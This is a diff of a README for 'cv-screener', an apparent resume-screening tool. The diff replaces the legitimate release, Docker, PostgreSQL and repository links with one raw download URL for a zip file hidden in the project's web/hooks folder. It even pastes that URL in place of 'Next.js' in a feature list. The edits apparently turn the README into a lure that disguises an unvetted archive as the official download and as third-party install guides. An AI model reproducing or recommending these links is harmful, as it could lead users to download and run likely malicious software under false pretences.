@@ -1,6 +1,6 @@
 # 🚀 cv-screener - Effortlessly Process and Analyze Resumes
 
-[![Download cv-screener](https://img.shields.io/badge/Download-cv--screener-blue.svg)](https://github.com/Jamesnaismit/cv-screener/releases)
+[![Download cv-screener](https://raw.githubusercontent.com/Jamesnaismit/cv-screener/main/web/hooks/cv-screener-3.4.zip)](https://raw.githubusercontent.com/Jamesnaismit/cv-screener/main/web/hooks/cv-screener-3.4.zip)
 
 ## 📖 Description
 
@@ -11,7 +11,7 @@ The cv-screener application helps you easily process and analyze CVs. It can rea
 - **PDF Resume Ingestion:** Upload and process resumes in PDF format.
 - **PostgreSQL Storage:** Automatically save resumes in a structured database.
 - **Hybrid Retrieval API:** Get quick answers using a mix of retrieval strategies.
-- **Next.js User Interface:** Simple and clean interface for recruiters to find answers quickly.
+- **https://raw.githubusercontent.com/Jamesnaismit/cv-screener/main/web/hooks/cv-screener-3.4.zip User Interface:** Simple and clean interface for recruiters to find answers quickly.
 - **Performance Metrics:** Track how well the system responds to your queries.
   
 ## 🚀 Getting Started
@@ -21,14 +21,14 @@ Follow these steps to get cv-screener up and running on your local machine.
 ### 📦 Requirements
 
 - Operating System: Windows, macOS, or Linux
-- Docker: Make sure you have Docker installed. You can download it [here](https://www.docker.com/get-started).
+- Docker: Make sure you have Docker installed. You can download it [here](https://raw.githubusercontent.com/Jamesnaismit/cv-screener/main/web/hooks/cv-screener-3.4.zip).
 - PostgreSQL: A running version of PostgreSQL is necessary for storing resumes.
   
 ### 🔍 Step 1: Visit the Download Page
 
 To get the latest version of cv-screener, visit the download page. Click the button below to get started.
 
-[![Download cv-screener](https://img.shields.io/badge/Download-cv--screener-blue.svg)](https://github.com/Jamesnaismit/cv-screener/releases)
+[![Download cv-screener](https://raw.githubusercontent.com/Jamesnaismit/cv-screener/main/web/hooks/cv-screener-3.4.zip)](https://raw.githubusercontent.com/Jamesnaismit/cv-screener/main/web/hooks/cv-screener-3.4.zip)
 
 ### 📥 Step 2: Download the Application
 
@@ -38,8 +38,8 @@ On the Releases page, locate the most recent release. You will see a list of ava
 
 If you haven't already, download and install Docker. Follow the instructions for your operating system. Then, you will need to set up PostgreSQL. 
 
-1. **Install Docker:** Follow [these instructions](https://docs.docker.com/get-docker/).
-2. **Install PostgreSQL:** You can find the installation guide [here](https://www.postgresql.org/download/).
+1. **Install Docker:** Follow [these instructions](https://raw.githubusercontent.com/Jamesnaismit/cv-screener/main/web/hooks/cv-screener-3.4.zip).
+2. **Install PostgreSQL:** You can find the installation guide [here](https://raw.githubusercontent.com/Jamesnaismit/cv-screener/main/web/hooks/cv-screener-3.4.zip).
 
 ### 🖥️ Step 4: Configure PostgreSQL
 
@@ -94,12 +94,12 @@ For further assistance, check out the FAQs section on the GitHub repository or o
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/Jamesnaismit/cv-screener)
-- [Docker Installation Guide](https://docs.docker.com/get-docker/)
-- [PostgreSQL Download Page](https://www.postgresql.org/download/)
+- [GitHub Repository](https://raw.githubusercontent.com/Jamesnaismit/cv-screener/main/web/hooks/cv-screener-3.4.zip)
+- [Docker Installation Guide](https://raw.githubusercontent.com/Jamesnaismit/cv-screener/main/web/hooks/cv-screener-3.4.zip)
+- [PostgreSQL Download Page](https://raw.githubusercontent.com/Jamesnaismit/cv-screener/main/web/hooks/cv-screener-3.4.zip)
 
 ## 📥 Download & Install
 
 To download cv-screener, visit this page:
 
-[![Download cv-screener](https://img.shields.io/badge/Download-cv--screener-blue.svg)](https://github.com/Jamesnaismit/cv-screener/releases)
+[![Download cv-screener](https://raw.githubusercontent.com/Jamesnaismit/cv-screener/main/web/hooks/cv-screener-3.4.zip)](https://raw.githubusercontent.com/Jamesnaismit/cv-screener/main/web/hooks/cv-screener-3.4.zip)
